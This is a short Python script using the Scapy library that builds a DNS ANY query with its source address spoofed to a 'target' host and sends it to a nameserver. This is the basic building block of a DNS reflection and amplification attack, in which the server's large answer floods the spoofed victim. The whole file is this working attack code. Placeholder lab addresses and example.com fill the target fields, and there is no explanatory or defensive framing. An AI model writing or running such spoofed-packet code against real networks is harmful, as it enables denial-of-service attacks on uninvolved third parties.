 #!/usr/bin/env python
 
from scapy.all import *
 
target     = "10.0.0.162" # Target host
nameserver = "10.0.0.183" # DNS server
domain     = "example.com" # Some domain name like "google.com" etc.

ip  = IP(src=target, dst=nameserver)
udp = UDP(dport=53)
dns = DNS(rd=1, qdcount=1, qd=DNSQR(qname=domain, qtype=255))

request = (ip/udp/dns)
 
send(request) 

